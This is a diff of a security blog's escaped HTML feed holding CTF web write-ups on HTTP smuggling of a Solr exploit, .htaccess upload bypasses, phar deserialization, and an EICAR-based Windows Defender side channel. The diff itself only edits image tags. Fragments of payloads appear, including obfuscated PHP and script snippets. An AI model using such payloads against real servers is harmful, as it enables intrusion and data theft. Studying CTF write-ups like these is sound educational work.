 >&lt;/p></description></item><item><title>Red Hat 2019 Web Write Up</title><link>https://zeddyu.github.io/p/red-hat-2019-web-write-up/</link><pubDate>Wed, 13 Nov 2019 15:18:06 +0000</pubDate><guid>https://zeddyu.github.io/p/red-hat-2019-web-write-up/</guid><description>&lt;p>红帽杯 2019 Web Write Up (除 iCloudMusic&lt;/p>
 &lt;p>[TOC]&lt;/p>
@@ -11301,7 +11295,7 @@ loading="lazy"
 &lt;/h2>&lt;p>&lt;strong>Second Blood&lt;/strong>&lt;/p>
 &lt;p>做的还是比较有意思的一题，可惜当时做的比较zz，本来可以一血，就是因为自己弄的太不小心了。&lt;/p>
 &lt;p>因为之前一直在研究 HTTP Smuggling 的东西，我在腾讯的导师也对这个挺感兴趣的，前阵子给我发了一个 Websocket Smuggling&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191113011351.png&lt;img src="https://blogpic.zdy.one/img/20191113011351.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113011351.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>看完后一脸懵逼，文章跟之前 Black Hat 2019 HTTP Desync 那个议题一样，只说了有这么个攻击面，但是没有说怎么产生的，但是还好给了 POC 以及一些 challs ，虽然我当时复现了一下，但是依然懵逼。&lt;/p>
@@ -11398,7 +11392,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>发现是个302跳转&amp;hellip;&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191112113326.png&lt;img src="https://blogpic.zdy.one/img/20191112113326.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191112113326.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>看来还是得起本地环境来试试看，刚好 &lt;a class="link" href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener"
@@ -11435,12 +11429,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>让我们试试看，把 burp 与文章 burp 拉到同样高度，然后 xml 标签之后随便弄几个 payload&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191112180836.png&lt;img src="https://blogpic.zdy.one/img/20191112180836.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191112180836.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我靠，简直一毛一样 XD&lt;/p>
 &lt;p>我感觉我要一血了，侧信道攻击真的牛批。然而正如上图，他喵的还是没回显啊&amp;hellip;&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191112115732.png&lt;img src="https://blogpic.zdy.one/img/20191112115732.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191112115732.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Emmm&amp;hellip;.陷入沉思&lt;/p>
@@ -11717,11 +11711,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/RDF&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191113000752.png&lt;img src="https://blogpic.zdy.one/img/20191113000752.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113000752.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这样我们就成功构造了回显，然后用 smuggling 方法发送上面的请求就可以了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191113000857.png&lt;img src="https://blogpic.zdy.one/img/20191113000857.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191113000857.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>给比我做的快的师傅递茶tql，自己还是做的太慢了orz&amp;hellip;&lt;/p>
@@ -12063,7 +12057,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>所以我们需要找到一个比较特殊的图片格式&lt;/p>
-&lt;p>Permalink before if: https://camo.githubusercontent.com/d0d1c8f073751aaf07547ea779cc82a02052e3a5/68747470733a2f2f692e696d6775722e636f6d2f6f7857416341362e706e67&lt;img src="https://camo.githubusercontent.com/d0d1c8f073751aaf07547ea779cc82a02052e3a5/68747470733a2f2f692e696d6775722e636f6d2f6f7857416341362e706e67"
+&lt;p>&lt;img src="https://camo.githubusercontent.com/d0d1c8f073751aaf07547ea779cc82a02052e3a5/68747470733a2f2f692e696d6775722e636f6d2f6f7857416341362e706e67"
 loading="lazy"
 >&lt;/p>
 &lt;p>查看 &lt;a class="link" href="https://en.wikipedia.org/wiki/X_BitMap" target="_blank" rel="noopener"
@@ -12089,7 +12083,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>XBM 文件竟然可以用&lt;code>#define&lt;/code>来规定图片的 width &amp;amp; height，而&lt;code>#&lt;/code>在&lt;code>.htaccess&lt;/code>文件中恰好是注释符，也不会引起解析错误，所以我们可以往这个方向去试一试。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190827155221.png&lt;img src="https://blogpic.zdy.one/img/20190827155221.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190827155221.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>将 width &amp;amp; height 改成需要的数值，这样我们就可以上传&lt;code>.htaccess&lt;/code>了&lt;/p>
@@ -12149,11 +12143,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后再上传一个宽度高度符合要求的 xbm 文件即可。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190828023441.png&lt;img src="https://blogpic.zdy.one/img/20190828023441.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190828023441.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然也可以使用其他编码啦，比如 utf-16，一种大端编码的方式，一个字符由两个字节编码，我们可以这么构造：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190830022019.png&lt;img src="https://blogpic.zdy.one/img/20190830022019.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190830022019.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>exp.php 中的内容就是你想上传的 php 代码&lt;/p>
@@ -12347,7 +12341,7 @@ loading="lazy"
 &lt;/tbody>
 &lt;/table>
 &lt;p>还有这个 wbmp 的宽度高度格式有点奇怪，第三位是以 128 为基数算的，所以这里只能凑一下得到 1337 的高与宽&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190828165647.png&lt;img src="https://blogpic.zdy.one/img/20190828165647.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190828165647.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里需要注意一下有个坑，直接提交的话还不知什么原因会自动加上&lt;code>0xefbf&lt;/code>污染了原数据，所以这里需要手动写脚本交一下。&lt;/p>
@@ -12589,7 +12583,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>直接传上去运行就行了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190830010343.png&lt;img src="https://blogpic.zdy.one/img/20190830010343.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190830010343.png"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="ezphp">Ezphp
@@ -12764,7 +12758,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这时候&lt;code>/tmp/fl3g.php&lt;/code>当中的内容也是上面的内容，这时候&lt;code>.htaccess&lt;/code>因为我们访问了过一次&lt;code>index.php&lt;/code>被删除了，所以我们需要再写一次&lt;code>.htaccess&lt;/code>，还是一样的内容。&lt;/p>
 &lt;p>接着访问&lt;code>index.php&lt;/code>，可以看见我们包含的效果如下：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191003155539.jpg&lt;img src="https://blogpic.zdy.one/img/20191003155539.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003155539.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>之后我们就要思考怎么把一些恶意代码插到报错的内容当中了。&lt;/p>
@@ -12781,7 +12775,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>访问&lt;code>index.php&lt;/code>我们可以看到：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191003160349.jpg&lt;img src="https://blogpic.zdy.one/img/20191003160349.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003160349.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里&lt;code>&amp;lt;&lt;/code>被进行了 html 编码，所以我们这样去用&lt;code>include_path '/tmp'&lt;/code>包含的&lt;code>/tmp/fl3g.php&lt;/code>，自然也不可能执行代码。所以我们可能需要一些技巧来使得这些可以被解析。&lt;/p>
@@ -12824,7 +12818,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>访问&lt;code>index.php&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191003163200.jpg&lt;img src="https://blogpic.zdy.one/img/20191003163200.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003163200.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到 php-info&lt;/p>
@@ -13126,7 +13120,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以一步到位&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191003191545.jpg&lt;img src="https://blogpic.zdy.one/img/20191003191545.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191003191545.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="reference">Reference
@@ -13180,7 +13174,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190911181803.png&lt;img src="https://blogpic.zdy.one/img/20190911181803.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190911181803.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以发现我们并没有触发 Windows Defender，即使字符串是 EICAR 测试样本，说明了字符串不受 EICAR 特征影响。&lt;/p>
@@ -13195,7 +13189,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190911181841.png&lt;img src="https://blogpic.zdy.one/img/20190911181841.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190911181841.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>没错，在保存的时候就立马触发了 Windows Defender ，足以验证当中有一个 Javascript Engine 进行了内容检测，而且即使没有完整的 Javascript 标签，也可以触发 Windows defender。&lt;/p>
@@ -13215,7 +13209,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190912100623.png&lt;img src="https://blogpic.zdy.one/img/20190912100623.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912100623.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>非常棒，并没有被检测出恶意内容。&lt;/p>
@@ -13236,7 +13230,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190912100640.png&lt;img src="https://blogpic.zdy.one/img/20190912100640.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912100640.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>也很棒，也没有检测出恶意内容。&lt;/p>
@@ -13259,7 +13253,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190912100648.png&lt;img src="https://blogpic.zdy.one/img/20190912100648.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912100648.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Done! 触发了恶意内容检测。&lt;/p>
@@ -13282,7 +13276,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>a&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190912103004.png&lt;img src="https://blogpic.zdy.one/img/20190912103004.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912103004.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我们获取的是&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签中的第一个字符，也就是&lt;code>a&lt;/code>，不构成 EICAR 测试样本，所以触发不了 Windows Defender 也很正常。&lt;/p>
@@ -13305,7 +13299,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>*&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190912103146.png&lt;img src="https://blogpic.zdy.one/img/20190912103146.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912103146.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>很棒，意料之中地触发了 Windows Defender。&lt;/p>
@@ -13432,7 +13426,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span> &lt;span class="nx">num&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span> &lt;span class="p">}&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190912130704.png&lt;img src="https://blogpic.zdy.one/img/20190912130704.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190912130704.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这样我们就可以通过“盲注”的方式获取&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签中的秘密数据了。&lt;/p>
@@ -14799,7 +14793,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个方法的缺点也比较明显，需要爆破&amp;hellip;于是我用 intruder 爆了一下，运气也比较好，5s 就出来了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190917021622.png&lt;img src="https://blogpic.zdy.one/img/20190917021622.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190917021622.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="ezcms">EzCMS
@@ -15834,11 +15828,11 @@ loading="lazy"
 &lt;/h3>&lt;p>触发函数有了，那么接下里就是触发条件了。既然是与文件有关的函数均能触发 phar 反序列化，那么伪协议呢？&lt;/p>
 &lt;p>通过 @zsx 师傅的挖掘，发现基本上大多数 PHP stream 都可以通过 phar:// 来触发，但是就是没有提及 php:// 伪协议。&lt;/p>
 &lt;p>So，让我们用最常见的 &lt;code>php://filter/read=convert.base64-encode/resource=&lt;/code>试一下&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190820121822.png&lt;img src="https://blogpic.zdy.one/img/20190820121822.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820121822.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>好的，那么再看看文件包含如何&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190820121956.png&lt;img src="https://blogpic.zdy.one/img/20190820121956.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820121956.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>一点也不意外，我们可以通过 php://filter 来绕过一些开头限制进行 phar 反序列化&lt;/p>
@@ -15854,15 +15848,15 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>禁用了外部实体，虽然题目给出的反射类确实可以反射，而且也可以进行 XXE，也有过相关的 CTF题 &lt;a class="link" href="https://www.anquanke.com/post/id/170299#h2-2" target="_blank" rel="noopener"
 >Annoying class&lt;/a>，虽然控制了 /flag 读取权限，可是为什么还要禁用外部实体呢？难不成 XXE 也可以反序列化？&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190820150125.png&lt;img src="https://blogpic.zdy.one/img/20190820150125.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820150125.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Test.xml 中的内容就是上面 &lt;code>$xml&lt;/code>的内容&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190820150346.png&lt;img src="https://blogpic.zdy.one/img/20190820150346.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820150346.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当然 php://filter 在这里也适用&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190820150839.png&lt;img src="https://blogpic.zdy.one/img/20190820150839.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820150839.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="mysql">Mysql
@@ -15912,7 +15906,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>其实也就是 @LoRexxar&amp;rsquo; 在 Tsec 上进行的分享 &lt;a class="link" href="https://paper.seebug.org/998/" target="_blank" rel="noopener"
 >Comprehensive analysis of the mysql client attack chain&lt;/a> 的内容了，@zsx 文章中指出&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190820151817.png&lt;img src="https://blogpic.zdy.one/img/20190820151817.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190820151817.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>既然可以这么触发，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。&lt;/p>
@@ -15991,7 +15985,7 @@ loading="lazy"
 &lt;/div>&lt;h1 id="write-up">Write Up
 &lt;/h1>&lt;h2 id="explation">Explation
 &lt;/h2>&lt;p>题目代码比较简单，首先看看第一个正则：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190711014316.png&lt;img src="https://blogpic.zdy.one/img/20190711014316.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190711014316.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>再看看第二个过滤，&lt;code>strtolower&lt;/code>将字符串转换为小写，用&lt;code>count_chars&lt;/code>返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于 13&lt;/p>
@@ -16179,7 +16173,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">.&lt;/span>&lt;span class="nx">chr&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">**&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">**&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="o">!!@&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))();&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190713013742.jpg&lt;img src="https://blogpic.zdy.one/img/20190713013742.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190713013742.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是这里要需要用到&lt;code>.&lt;/code>进行字符串拼接，然而&lt;code>.&lt;/code>又被 ban 掉了，所以我们得另寻他路&lt;/p>
@@ -16286,7 +16280,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>&lt;span class="c1">//phpinfo
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190713122647.jpg&lt;img src="https://blogpic.zdy.one/img/20190713122647.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190713122647.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>结果回显&lt;code>you are so close, omg&lt;/code>&lt;/p>
@@ -16322,7 +16316,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nx">AYAYYRY&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">trim&lt;/span>&lt;span class="p">(((((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">)))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="o">!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">+!!&lt;/span>&lt;span 